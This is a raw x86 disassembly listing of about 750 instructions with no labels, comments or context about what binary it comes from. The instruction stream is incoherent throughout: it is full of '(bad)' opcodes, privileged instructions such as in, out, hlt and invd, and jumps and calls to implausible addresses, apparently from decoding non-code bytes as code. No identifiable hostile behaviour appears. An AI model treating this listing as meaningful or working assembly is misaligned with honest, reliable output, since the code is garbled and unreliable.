  40fb67:	mov    eax,DWORD PTR [ebp-0x4]
  40fb6a:	xor    edi,DWORD PTR [ebp-0x73]
  40fb6d:	xor    eax,DWORD PTR [ebx]
  40fb6f:	xor    esi,DWORD PTR [edx+0x3]
  40fb72:	add    BYTE PTR [ecx],bh
  40fb74:	inc    ebp
  40fb75:	(bad)  
  40fb76:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fb7c:	mov    DWORD PTR [eax],0x750f0004
  40fb82:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fb88:	lock add BYTE PTR [ebp+0x0],cl
  40fb8c:	mov    esi,DWORD PTR [ebp-0x18]
  40fb8f:	mov    ebp,edx
  40fb91:	or     al,0x72
  40fb93:	ja     0x40fb95
  40fb95:	mov    edx,esi
  40fb97:	cld    
  40fb98:	(bad)  
  40fb9b:	cli    
  40fb9c:	mov    esi,DWORD PTR [ebp-0x4]
  40fb9f:	cmp    ecx,esi
  40fba1:	bswap  edi
  40fba3:	(bad)
  40fba7:	mov    esi,DWORD PTR [ebp-0x4]
  40fbaa:	mov    esi,ecx
  40fbac:	clc    
  40fbad:	repnz add esi,DWORD PTR [ebp+0x45]
  40fbb1:	push   ebx
  40fbb2:	xor    eax,DWORD PTR [ebp+0x3]
  40fbb5:	cmp    al,0x5f
  40fbb7:	pushf  
  40fbb8:	pop    ebx
  40fbb9:	jmp    0x40fc80
  40fbbe:	mov    esi,DWORD PTR [ebp-0x7d]
  40fbc1:	xor    ebp,DWORD PTR [eax]
  40fbc3:	lea    eax,[ebp-0x8]
  40fbc6:	xor    edx,esi
  40fbc8:	pushf  
  40fbc9:	out    dx,eax
  40fbca:	(bad)  
  40fbcb:	neg    eax
  40fbcd:	ins    DWORD PTR es:[edi],dx
  40fbce:	test   esi,edi
  40fbd0:	clc    
  40fbd1:	pop    esp
  40fbd2:	inc    ebp
  40fbd3:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fbd9:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fbdf:	add    cl,al
  40fbe1:	jne    0x40fb7e
  40fbe3:	mov    esi,DWORD PTR [edx]
  40fbe5:	in     al,dx
  40fbe6:	push   esi
  40fbe7:	xor    BYTE PTR [ebp-0xe],dh
  40fbea:	add    edi,esi
  40fbec:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fbf2:	add    cl,bh
  40fbf4:	mov    edi,DWORD PTR [ebp+0x8]
  40fbf7:	mov    DWORD PTR [ebp-0x14],esi
  40fbfa:	add    esi,DWORD PTR [ebp+0x3c]
  40fbfd:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fc03:	mov    ah,0x3e
  40fc05:	fwait
  40fc06:	pushf  
  40fc07:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fc0d:	jne    0x40fb9a
  40fc0f:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fc12:	icebp  
  40fc13:	icebp  
  40fc14:	shl    edx,0xf2
  40fc17:	(bad)  
  40fc18:	mov    ah,0x16
  40fc1a:	push   eax
  40fc1b:	jne    0x40fbb0
  40fc1d:	mov    ecx,DWORD PTR [edi]
  40fc1f:	in     al,dx
  40fc20:	jmp    0x40fc13
  40fc22:	add    dl,dh
  40fc24:	mov    edi,esi
  40fc26:	or     al,0x8
  40fc28:	inc    ebp
  40fc29:	jne    0x40fc2e
  40fc2b:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fc31:	ret    
  40fc32:	or     bh,bh
  40fc34:	jge    0x40fc1e
  40fc36:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fc3c:	xor    edi,eax
  40fc3e:	add    esi,DWORD PTR [ebp-0x77]
  40fc41:	mov    ebx,esp
  40fc43:	clc    
  40fc44:	neg    DWORD PTR [ebp-0x7c]
  40fc47:	xor    eax,DWORD PTR [eax]
  40fc49:	cmp    eax,DWORD PTR [eax]
  40fc4b:	repz jne 0x40fbe3
  40fc4e:	xor    eax,DWORD PTR [ecx]
  40fc50:	add    ebx,DWORD PTR [eax]
  40fc52:	mov    DWORD PTR [ebp-0x8],eax
  40fc55:	mov    eax,edi
  40fc57:	cld    
  40fc58:	lock pop eax
  40fc5a:	test   DWORD PTR [ebx],esi
  40fc5c:	clc    
  40fc5d:	add    edx,DWORD PTR [edi-0x740bff77]
  40fc63:	fdivp  st(4),st
  40fc65:	test   ecx,esi
  40fc67:	(bad)  
  40fc68:	jnp    0x40fc69
  40fc6a:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fc70:	jae    0x40fbfd
  40fc72:	sub    edi,esp
  40fc74:	(bad)  
  40fc75:	shl    DWORD PTR [eax-0x3e],0x89
  40fc79:	leave  
  40fc7a:	call   0x8196b387
  40fc7f:	in     al,dx
  40fc80:	(bad)  
  40fc81:	in     al,dx
  40fc82:	add    bh,al
  40fc84:	mov    esp,edi
  40fc86:	in     al,dx
  40fc87:	test   DWORD PTR [ebp-0x8],edi
  40fc8a:	mov    eax,DWORD PTR [ebp+0x2b]
  40fc8d:	xor    al,BYTE PTR [ebx]
  40fc8f:	pushf  
  40fc90:	jnp    0x572ff8c9
  40fc96:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  40fc9a:	loopne 0x40fccf
  40fc9c:	jne    0x40fc59
  40fc9e:	mov    esi,DWORD PTR [edx-0x20]
  40fca1:	add    BYTE PTR [ebp-0x3d],bh
  40fca4:	xor    eax,DWORD PTR [ebp-0x73]
  40fca7:	mov    edi,DWORD PTR [esi]
  40fca9:	cld    
  40fcaa:	jb     0x40fc72
  40fcac:	add    bl,al
  40fcae:	jne    0x40fcf5
  40fcb0:	mov    edx,DWORD PTR [edi-0x10]
  40fcb3:	jge    0x40fd32
  40fcb5:	mov    esi,DWORD PTR [ebx]
  40fcb7:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fcbb:	xor    esi,DWORD PTR [ebp-0x77]
  40fcbe:	mov    esi,eax
  40fcc0:	lock inc ebp
  40fcc2:	jge    0x40fcf5
  40fcc4:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fccb:	dec    ebp
  40fccc:	mov    esi,DWORD PTR [ebx]
  40fcce:	loopne 0x40fc59
  40fcd0:	jge    0x40fcca
  40fcd2:	add    DWORD PTR [ebp-0x7d],eax
  40fcd5:	icebp  
  40fcd6:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fcdd:	dec    ebp
  40fcde:	hlt    
  40fcdf:	xor    ebx,DWORD PTR [ebp-0x77]
  40fce2:	mov    esi,esp
  40fce4:	in     al,0x45
  40fce6:	jge    0x40fd25
  40fce8:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fcef:	dec    ebp
  40fcf0:	push   esp
  40fcf1:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  40fcf7:	inc    ebp
  40fcf8:	hlt    
  40fcf9:	xor    DWORD PTR [ebp-0x61],esi
  40fcfc:	mov    edi,DWORD PTR [eax+0xf19504]
  40fd02:	repnz mov DWORD PTR [ebp+0x20],ebx
  40fd06:	cmp    eax,DWORD PTR [ebp+0xf]
  40fd09:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fd0d:	fistp  WORD PTR [ebx+0x0]
  40fd10:	inc    ebp
  40fd11:	mov    ebx,DWORD PTR [edi+0xc]
  40fd14:	add    eax,eax
  40fd16:	inc    ebp
  40fd17:	test   BYTE PTR [ebx],dh
  40fd19:	add    eax,DWORD PTR [ebx]
  40fd1b:	add    BYTE PTR [esi+0x45],bl
  40fd1e:	ret    0x85
  40fd21:	jnp    0x544180f0
  40fd27:	inc    bp
  40fd29:	inc    ebp
  40fd2a:	xor    DWORD PTR [ecx+0xc78a9c],edi
  40fd30:	fdiv   QWORD PTR [ebx]
  40fd32:	test   DWORD PTR [ecx+0x453bf8],edi
  40fd38:	push   ebx
  40fd39:	add    edi,DWORD PTR [esi+0x708088b]
  40fd3f:	cmp    esi,eax
  40fd41:	setnp  BYTE PTR [ecx-0x74fcffce]
  40fd48:	mov    esp,edi
  40fd4a:	call   0x33cc429c
  40fd4f:	or     BYTE PTR [ebx],al
  40fd51:	inc    ecx
  40fd52:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40fd58:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fd5e:	lock add cl,al
  40fd61:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fd68:	mov    ch,0x45
  40fd6a:	clc    
  40fd6b:	xor    eax,DWORD PTR [ebp+0x3]
  40fd6e:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fd74:	inc    ebp
  40fd75:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fd7b:	mov    edi,eax
  40fd7d:	mov    eax,DWORD PTR [ebp+0x3c]
  40fd80:	mov    ecx,DWORD PTR [eax]
  40fd82:	hlt    
  40fd83:	inc    ebp
  40fd84:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40fd8b:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fd91:	push   ebp
  40fd92:	mov    edi,DWORD PTR [ebx]
  40fd94:	in     al,dx
  40fd95:	jne    0x40fd58
  40fd97:	mov    eax,DWORD PTR [ebp-0x28]
  40fd9a:	add    DWORD PTR [eax],0xe8058dec
  40fda0:	clc    
  40fda1:	mov    esi,DWORD PTR [edi-0x8]
  40fda4:	add    dh,dl
  40fda6:	rol    WORD PTR [ebp-0x1],cl
  40fdaa:	mov    edx,DWORD PTR [eax+0x8]
  40fdad:	jne    0x40fd6f
  40fdaf:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40fdb6:	inc    ebp
  40fdb7:	push   esp
  40fdb8:	test   DWORD PTR [ecx+0xf],ecx
  40fdbb:	sub    edx,esp
  40fdbd:	add    eax,DWORD PTR [eax]
  40fdbf:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40fdc5:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40fdcc:	mov    eax,DWORD PTR [ecx]
  40fdce:	and    BYTE PTR [eax],al
  40fdd0:	cmp    al,0x10
  40fdd2:	add    BYTE PTR [ebp+0x66],al
  40fdd5:	inc    ecx
  40fdd7:	push   esp
  40fdd8:	add    dh,BYTE PTR [ebp+0x0]
  40fddb:	push   edx
  40fddc:	enterw 0xc1,0x4d
  40fde1:	mov    esp,DWORD PTR [esi+0x20]
  40fde4:	add    DWORD PTR [ecx-0x7b],eax
  40fde7:	add    eax,DWORD PTR [ebx]
  40fde9:	str    WORD PTR [eax+0x45]
  40fded:	lea    ecx,[ebx+0x45890801]
  40fdf3:	sbb    BYTE PTR [ebx],al
  40fdf5:	dec    ebp
  40fdf6:	cmp    al,0xf
  40fdf8:	inc    ebp
  40fdf9:	push   eax
  40fdfa:	mov    esi,DWORD PTR [ebx]
  40fdfc:	push   eax
  40fdfd:	add    eax,eax
  40fdff:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40fe06:	inc    ebp
  40fe07:	add    BYTE PTR [ecx],dh
  40fe09:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  40fe10:	(bad)  
  40fe11:	mov    ebx,eax
  40fe13:	loopne 0x40fe5a
  40fe15:	dec    ebp
  40fe16:	mov    ecx,DWORD PTR [edi]
  40fe18:	cld    
  40fe19:	push   eax
  40fe1a:	xchg   DWORD PTR [ebx],esi
  40fe1c:	add    DWORD PTR [ebx],ebp
  40fe1e:	add    BYTE PTR [ebx],ch
  40fe20:	or     BYTE PTR [ecx],bh
  40fe22:	dec    ecx
  40fe23:	loopne 0x40fe28
  40fe25:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40fe2b:	push   ebp
  40fe2c:	add    DWORD PTR [ebx+0x55100800],eax
  40fe32:	dec    ebp
  40fe33:	jmp    0x40fdbe
  40fe35:	mov    esp,DWORD PTR [eax]
  40fe37:	sbb    dl,dl
  40fe39:	inc    eax
  40fe3a:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40fe40:	add    BYTE PTR [ebx+0x74528555],cl
  40fe46:	push   ebp
  40fe47:	div    DWORD PTR [ebx]
  40fe49:	and    eax,DWORD PTR [ebx]
  40fe4b:	add    edx,DWORD PTR [edx-0x30]
  40fe4e:	jno    0x40fddb
  40fe50:	inc    DWORD PTR [eax+eiz*1]
  40fe53:	inc    ebp
  40fe54:	push   eax
  40fe55:	push   eax
  40fe56:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40fe5c:	mov    edi,esp
  40fe5e:	push   eax
  40fe5f:	inc    ebp
  40fe60:	enter  0x458b,0x8
  40fe64:	push   ecx
  40fe65:	(bad)  
  40fe66:	call   0x10b083e
  40fe6b:	pop    ss
  40fe6c:	push   ebp
  40fe6d:	mov    ecx,DWORD PTR [ebx+0x489408]
  40fe73:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40fe79:	push   ecx
  40fe7a:	jo     0x40fe64
  40fe7c:	inc    DWORD PTR [edi]
  40fe7e:	or     BYTE PTR [eax],al
  40fe80:	call   0xcc05ca
  40fe85:	fmul   QWORD PTR [ebp+0x55]
  40fe88:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fe8e:	mov    bh,0x8c
  40fe90:	adc    al,0x9b
  40fe92:	dec    esp
  40fe93:	xor    bl,BYTE PTR [eax]
  40fe95:	mov    ecx,DWORD PTR [ebp+0xc]
  40fe98:	mov    eax,DWORD PTR [ebp-0x4]
  40fe9b:	mov    esi,DWORD PTR [edi-0x3148f924]
  40fea1:	push   es
  40fea2:	retf   
  40fea3:	mov    BYTE PTR [ebp-0x30],0x3b
  40fea7:	inc    ebp
  40fea8:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  40feaf:	retf   0x83fc
  40feb2:	into   
  40feb3:	dec    ebp
  40feb4:	retf   
  40feb5:	mov    ecx,DWORD PTR [ebp-0x74]
  40feb8:	mov    eax,DWORD PTR [eax]
  40feba:	fdiv   QWORD PTR [ebx]
  40febc:	mov    bh,0x3
  40febe:	push   es
  40febf:	mov    esi,ecx
  40fec1:	sbb    cl,dl
  40fec3:	dec    ebp
  40fec4:	sar    DWORD PTR [ebx],cl
  40fec6:	push   ebp
  40fec7:	jne    0x40fed8
  40fec9:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  40fecf:	lea    ebx,[eax]
  40fed1:	call   0xf4ca8a98
  40fed6:	sbb    dh,dl
  40fed8:	add    edx,ebx
  40feda:	push   ebp
  40fedb:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  40fee1:	push   ecx
  40fee2:	mov    DWORD PTR [eax-0x30],edx
  40fee5:	test   DWORD PTR [edx],eax
  40fee7:	xadd   esp,esi
  40feea:	pop    es
  40feeb:	add    cl,dl
  40feed:	mov    eax,ecx
  40feef:	or     al,0x45
  40fef1:	(bad)  
  40fef2:	push   eax
  40fef3:	add    DWORD PTR [edx+0x0],eax
  40fef6:	add    ecx,DWORD PTR [ecx]
  40fef8:	and    dh,cl
  40fefa:	call   0xc507ca
  40feff:	add    DWORD PTR [ebp+0x0],edx
  40ff02:	mov    esp,DWORD PTR [ebp+0x18]
  40ff05:	add    BYTE PTR [eax+0x50],cl
  40ff08:	xor    eax,DWORD PTR [eax]
  40ff0a:	add    esp,DWORD PTR [esi+0x3b]
  40ff0d:	inc    ebp
  40ff0e:	je     0x40fe93
  40ff10:	push   ecx
  40ff11:	dec    BYTE PTR [ebp-0x77]
  40ff14:	add    eax,esi
  40ff16:	or     al,0x5e
  40ff18:	inc    eax
  40ff19:	add    BYTE PTR [ebx],al
  40ff1b:	data16 and BYTE PTR [ebp+0x50],al
  40ff1f:	sub    DWORD PTR [ecx],0xfffffff8
  40ff22:	add    BYTE PTR [ebp-0x75],ah
  40ff25:	add    BYTE PTR [eax],bl
  40ff27:	enter  0x894d,0x8b
  40ff2b:	int3   
  40ff2c:	loopne 0x40fef0
  40ff2e:	rol    BYTE PTR [eax],0x33
  40ff31:	lea    cx,[ebp+0xa]
  40ff35:	data16 jb 0x40ff7d
  40ff38:	add    BYTE PTR [ebx+0x44890855],cl
  40ff3e:	sbb    ah,al
  40ff40:	inc    ebp
  40ff41:	cmp    al,0xf
  40ff43:	add    BYTE PTR [edx+0x66],dl
  40ff46:	xor    ecx,DWORD PTR [eax]
  40ff48:	sub    eax,DWORD PTR [edx]
  40ff4a:	mov    eax,DWORD PTR [eax]
  40ff4c:	or     al,0x66
  40ff4e:	ror    edx,cl
  40ff50:	dec    ebp
  40ff51:	inc    ebp
  40ff52:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  40ff58:	cld    
  40ff59:	or     BYTE PTR [edi+0x4501dd],dl
  40ff5f:	ret    0xecce
  40ff62:	retf   
  40ff63:	(bad)  
  40ff64:	dec    ebp
  40ff65:	mov    al,0x8b
  40ff67:	loopne 0x40ff89
  40ff69:	cmp    ecx,DWORD PTR [edx]
  40ff6b:	inc    ebp
  40ff6c:	daa    
  40ff6d:	loopne 0x40fef6
  40ff6f:	in     al,dx
  40ff70:	add    edi,eax
  40ff72:	add    BYTE PTR [eax+0x3f52e155],bh
  40ff78:	push   ebp
  40ff79:	inc    ebp
  40ff7a:	xor    ebx,edx
  40ff7c:	add    ebp,esp
  40ff7e:	push   edx
  40ff7f:	push   bp
  40ff81:	inc    ebp
  40ff82:	(bad)  
  40ff83:	in     eax,dx
  40ff84:	push   esp
  40ff85:	(bad)  
  40ff86:	inc    edx
  40ff88:	sbb    al,0x33
  40ff8a:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  40ff91:	add    BYTE PTR [ebp+0x46],0x8b
  40ff95:	jmp    0xf98b:0x100041c8
  40ff9c:	xor    esi,DWORD PTR [edx+0x3]
  40ff9f:	mov    ecx,DWORD PTR [edi]
  40ffa1:	fmul   DWORD PTR [edx]
  40ffa3:	add    BYTE PTR [eax],al
  40ffa5:	lea    eax,[ebx-0x4700273c]
  40ffab:	add    al,0x4f
  40ffad:	pop    DWORD PTR [eax]
  40ffaf:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  40ffb5:	push   edx
  40ffb6:	inc    WORD PTR [ebp+0x8]
  40ffba:	mov    eax,0x514f4d
  40ffbf:	(bad)
  40ffc3:	add    al,al
  40ffc5:	xor    DWORD PTR [ebx-0x74baf730],eax
  40ffcb:	test   DWORD PTR [esi+0x74],esp
  40ffce:	inc    ebp
  40ffcf:	mov    DWORD PTR [eax+0xa4e08],edi
  40ffd5:	add    BYTE PTR [ecx-0x76c435bb],cl
  40ffdb:	or     dh,cl
  40ffdd:	or     eax,0x8b8d5045
  40ffe2:	inc    ebp
  40ffe3:	mov    WORD PTR [ecx+0x3b8a00],?
  40ffe9:	jne    0x41001e
  40ffeb:	mov    edi,DWORD PTR [edx+0x8f3b18]
  40fff1:	add    DWORD PTR [ebx],eax
  40fff3:	add    bh,bh
  40fff5:	adc    DWORD PTR [eax],ecx
  40fff7:	adc    DWORD PTR [ebp+0x55],edi
  40fffa:	push   es
  40fffb:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410001:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  410008:	inc    ebp
  410009:	mov    esp,edi
  41000b:	or     al,0xda
  41000d:	push   eax
  41000e:	(bad)  
  41000f:	jne    0x40ffc5
  410011:	call   0x38f900
  410016:	inc    ebp
  410017:	sar    BYTE PTR [eax],0x84
  41001a:	in     al,dx
  41001b:	add    bh,al
  41001d:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  410024:	(bad)  
  410025:	and    al,al
  410027:	fs in  eax,dx
  410029:	inc    DWORD PTR [ebp-0x7b]
  41002c:	jle    0x41003d
  41002e:	leave  
  41002f:	scas   al,BYTE PTR es:[edi]
  410030:	inc    esp
  410031:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  410038:	or     BYTE PTR [ebx-0x97717c8],0x83
  41003f:	call   DWORD PTR [edi]
  410041:	shr    ah,0x84
  410044:	xchg   DWORD PTR [eax],eax
  410046:	add    DWORD PTR [eax],eax
  410048:	add    bh,bh
  41004a:	dec    ebp
  41004b:	and    BYTE PTR [ecx-0x38],dl
  41004e:	push   eax
  41004f:	dec    DWORD PTR [ebx+0xfd885]
  410055:	mov    BYTE PTR [ebp+0x508bac00],cl
  41005b:	mov    WORD PTR [ecx+0x0],ss
  41005e:	lea    ecx,[ebx+0x108b20d8]
  410064:	mov    WORD PTR [edx],ds
  410066:	add    BYTE PTR [edi+0xff01ff],al
  41006c:	mov    ecx,DWORD PTR [ebp-0x28]
  41006f:	push   ecx
  410070:	shl    BYTE PTR [ebp+0x3a],0x8b
  410074:	inc    ebp
  410075:	in     al,0xeb
  410077:	jno    0x410004
  410079:	push   edx
  41007a:	mov    DWORD PTR [eax-0x28],edx
  41007d:	mov    eax,DWORD PTR [ebp+0x20]
  410080:	je     0x410009
  410082:	mov    eax,DWORD PTR [ecx]
  410084:	sbb    BYTE PTR [eax],al
  410086:	pop    DWORD PTR [eax]
  410088:	add    esi,eax
  41008a:	add    bl,al
  41008c:	adc    DWORD PTR [edi],esi
  41008e:	jmp    0x8bcc50e0
  410093:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  41009a:	jne    0x410027
  41009c:	mov    ecx,DWORD PTR [eax]
  41009e:	in     al,0x75
  4100a0:	pop    DWORD PTR [ecx+0x5401]
  4100a6:	push   edx
  4100a7:	inc    DWORD PTR [ebx]
  4100a9:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4100af:	add    BYTE PTR [edi+0x9],dl
  4100b2:	call   DWORD PTR [esi]
  4100b4:	and    dl,al
  4100b6:	and    bh,bh
  4100b8:	inc    edi
  4100ba:	test   eax,edx
  4100bc:	sldt   ebx
  4100bf:	xor    al,BYTE PTR [eax]
  4100c1:	pushf  
  4100c2:	(bad)  
  4100c3:	jmp    0x4100d1
  4100c5:	mov    eax,edi
  4100c7:	or     al,0x75
  4100c9:	inc    eax
  4100ca:	call   0x40f7d2
  4100cf:	mov    eax,eax
  4100d1:	loopne 0x410057
  4100d3:	inc    ebp
  4100d4:	add    BYTE PTR [ebx+0x1451c00],cl
  4100da:	mov    eax,DWORD PTR [ebp+0x20]
  4100dd:	add    edi,ecx
  4100df:	add    BYTE PTR [eax],ch
  4100e1:	cmp    edi,0x18
  4100e4:	test   DWORD PTR [ebp+0xf],esi
  4100e7:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4100ee:	jne    0x4100f2
  4100f0:	call   0xff9ffbb5
  4100f5:	leave  
  4100f6:	rcr    BYTE PTR [esp+eax*4],0x55
  4100fa:	add    ah,ch
  4100fc:	add    BYTE PTR [edi-0x48fef979],dh
  410102:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  410109:	inc    esp
  41010a:	mov    ebx,DWORD PTR [eax]
  41010c:	fcom   st(2)
  41010e:	add    BYTE PTR [edi],bl
  410110:	lea    ecx,[eax-0x18]
  410113:	(bad)  
  410114:	push   DWORD PTR [ecx]
  410116:	call   0xffb34e78
  41011b:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  41011f:	fstp   DWORD PTR [esi+ebx*8]
  410122:	push   ebp
  410123:	pop    ebp
  410124:	mov    esi,DWORD PTR [edx-0x38]
  410127:	add    DWORD PTR [eax],0x28
  41012a:	mov    edi,DWORD PTR [ebx]
  41012c:	xor    esi,DWORD PTR [edx+0x3]
  41012f:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410133:	pop    ebp
  410134:	or     al,0x4
  410136:	inc    ecx
  410137:	push   ebp
  410138:	(bad)  
  410139:	in     al,dx
  41013a:	or     ah,ch
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	xbegin 0xffc67733
  410143:	clc    
  410144:	adc    al,0x45
  410146:	div    BYTE PTR [edx]
  410148:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  41014f:	test   DWORD PTR [ebx+0x666300f8],ebx
  410155:	add    BYTE PTR [ecx+0x66],dh
  410158:	add    eax,DWORD PTR [ebp+0x52]
  41015b:	adc    eax,0xffffffa0
  41015e:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  410164:	test   DWORD PTR [eax],eax
  410166:	clc    
  410167:	data16 or al,BYTE PTR [ebp+0x45]
  41016b:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  410172:	rol    BYTE PTR [ebp+0x45],1
  410175:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  41017b:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  410181:	push   ebx
  410182:	add    BYTE PTR [eax+eax*1+0x51],dl
  410186:	jge    0x4101bb
  410188:	add    BYTE PTR [esi+0x4],dl
  41018b:	jne    0x4101f2
  41018d:	mov    edx,0x457200
  410192:	jmp    0x410156
  410194:	xor    edi,DWORD PTR [ebx]
  410196:	pop    edi
  410197:	cvtdq2ps xmm7,xmm0
  41019a:	ret    0x0
  41019d:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4101a3:	xor    ecx,DWORD PTR [edi]
  4101a5:	add    eax,DWORD PTR [ecx+0x3b]
  4101a8:	push   ebx
  4101a9:	rdpmc  
  4101ab:	out    0x8d,al
  4101ad:	add    BYTE PTR [eax],cl
  4101af:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4101b5:	ret    0x450c
  4101b8:	sbb    al,0x8b
  4101ba:	cmp    eax,esi
  4101bc:	or     cl,al
  4101be:	or     al,0xc2
  4101c0:	pop    eax
  4101c1:	inc    ebp
  4101c2:	add    ecx,DWORD PTR [edi]
  4101c4:	add    esi,DWORD PTR [ebp+0x39]
  4101c7:	invd   
  4101c9:	jge    0x4101d5
  4101cb:	mov    eax,0x478ac0
  4101d0:	cli    
  4101d1:	xor    esp,ecx
  4101d3:	mov    ebx,0x5b8ac0
  4101d8:	ret    0x33
  4101db:	mov    eax,0x833b8b
  4101e0:	sub    BYTE PTR [ebx],al
  4101e2:	inc    ebp
  4101e3:	xor    ax,di
  4101e6:	pushf  
  4101e7:	inc    bh
  4101e9:	mov    esp,esp
  4101eb:	hlt    
  4101ec:	test   DWORD PTR [ebp-0x8],esi
  4101ef:	mov    eax,DWORD PTR [ebp-0x14]
  4101f2:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4101f8:	dec    edi
  4101f9:	or     BYTE PTR [eax],al
  4101fb:	jne    0x410186
  4101fd:	mov    esi,esp
  4101ff:	call   0x77a78dc4
  410204:	inc    ebp
  410205:	mov    DWORD PTR [eax+0x9b4f0c],edi
  41020b:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410211:	add    BYTE PTR [esi+0x7d],ah
  410214:	inc    ebp
  410215:	mov    bx,WORD PTR [ebp+0x8]
  410219:	add    DWORD PTR [ebp+0x54],0x30c008b
  410220:	inc    ebp
  410221:	mov    bx,di
  410224:	lock test BYTE PTR [ecx+0x7000801],bh
  41022b:	jge    0x4101ee
  41022d:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  410233:	cli    
  410234:	xor    bl,bh
  410236:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41023c:	test   BYTE PTR [eax],cl
  41023e:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  410245:	cmp    ebp,eax
  410247:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  41024e:	test   BYTE PTR [ebp+0x1],bh
  410251:	mov    ebx,0x458a00
  410256:	xor    esi,DWORD PTR [ebx]
  410258:	add    esp,DWORD PTR [esi-0x77]
  41025b:	pop    ebp
  41025c:	loopne 0x4102c4
  41025e:	inc    ebp
  41025f:	clc    
  410260:	xor    edi,DWORD PTR [ebx]
  410262:	add    esi,DWORD PTR [edx-0x77]
  410265:	data16 fdivr QWORD PTR [ebp-0x49]
  410269:	mov    ebx,0xb78afc
  41026e:	hlt    
  41026f:	xor    edi,DWORD PTR [esi+eiz*2]
  410272:	add    BYTE PTR [ebp+0x66],bl
  410275:	data16 lock clc 
  410278:	cmp    al,0x3b
  41027a:	add    BYTE PTR [edi+0x66],dh
  41027d:	psubq  mm7,QWORD PTR [ebp+0x2]
  410281:	ltr    WORD PTR [ebp+0x66]
  410285:	add    esi,eax
  410287:	add    di,WORD PTR [ebp+0x2b]
  41028b:	data16 data16 jge 0x41030c
  41028f:	mov    ebx,0xe08a8b
  410294:	jge    0x4102c9
  410296:	data16 data16 xor al,0x5d
  41029a:	data16 data16 jne 0x410296
  41029e:	mov    edi,DWORD PTR [ebx]
  4102a0:	fdiv   QWORD PTR [edx+0x7d]
  4102a3:	data16 data16 jge 0x4102db
  4102a7:	mov    ebx,0x758a66
  4102ac:	mov    esi,0x667233
  4102b1:	pop    ebp
  4102b2:	or     BYTE PTR [esi+0x0],ah
  4102b5:	clc    
  4102b6:	mov    edi,DWORD PTR [ebx]
  4102b8:	lock ja 0x410246
  4102bb:	(bad)  
  4102bd:	jge    0x4102b6
  4102bf:	invd   
  4102c1:	pop    ebp
  4102c2:	add    BYTE PTR [ebx],al
  4102c4:	(bad)  
  4102c5:	cmp    di,WORD PTR [ebp+0xf]
  4102c9:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4102cd:	mov    bx,WORD PTR [ebp-0x10]
  4102d1:	pop    bp
  4102d3:	fbstp  TBYTE PTR [ebx]
  4102d5:	test   DWORD PTR [ebx],eax
  4102d7:	add    BYTE PTR [ebx],bh
  4102d9:	add    BYTE PTR [esi+0x7d],ah
  4102dc:	jge    0x410269
  4102de:	data16 in al,dx
  4102e0:	pop    ebp
  4102e1:	stc    
  4102e2:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4102e9:	mov    edi,ebx
  4102eb:	in     al,dx
  4102ec:	test   BYTE PTR [ebp+0x0],bh
  4102ef:	mov    eax,DWORD PTR [eax]
